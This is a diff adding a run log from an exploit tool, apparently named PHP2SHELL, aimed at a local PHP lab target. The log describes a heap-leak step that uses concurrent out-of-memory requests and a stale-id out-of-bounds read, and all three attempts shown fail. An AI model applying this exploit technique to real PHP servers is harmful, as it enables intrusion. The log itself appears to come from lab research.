@@ -1,0 +1,22 @@
+
+=== 2026-10-23T03:22:02.939811+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: http://127.0.0.1:18112/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: multi-worker poisoning
+[*] multi leak: A1 wave + B1 (runtime address resolution)
+[try 1/3] multi A1 wave + B1
+      A1 wave: 4 concurrent END-cleanup OOMs
+      A1 statuses: 4/4 500
+      B1: stale-id OOB read from a poisoned child
+[!] multi leak failed: RuntimeError('no heap pointers in leak window')
+[try 2/3] multi A1 wave + B1
+      A1 wave: 4 concurrent END-cleanup OOMs
+      A1 statuses: 2/4 500, 2 errors
+      B1: stale-id OOB read from a poisoned child
+[!] multi leak failed: RuntimeError('no heap pointers in leak window')
+[try 3/3] multi A1 wave + B1
+      A1 wave: 4 concurrent END-cleanup OOMs
+      A1 statuses: 4/4 500
+      B1: stale-id OOB read from a poisoned child
+[!] multi leak failed: RuntimeError('no heap pointers in leak window')
